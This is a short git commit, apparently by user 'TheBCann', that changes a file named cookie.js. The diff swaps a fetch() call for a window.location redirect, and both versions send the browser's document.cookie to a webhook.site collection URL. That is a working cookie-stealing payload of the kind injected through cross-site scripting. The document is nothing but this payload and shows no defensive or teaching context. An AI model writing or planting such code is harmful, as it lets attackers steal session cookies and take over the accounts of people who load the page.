7095b19da30cefe3de77e2d68e80f83f671feb6f
TheBCann <161960060+TheBCann@users.noreply.github.com>
2026-02-04 23:24:14 -0500

    Change cookie fetch to redirect with cookie data

--- cookie.js
+++ cookie.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/b9c38efc-27d9-40fb-b645-aa773513c904?cookie='+document.cookie);
+window.location = "https://webhook.site/b9c38efc-27d9-40fb-b645-aa773513c904?c=" + document.cookie;
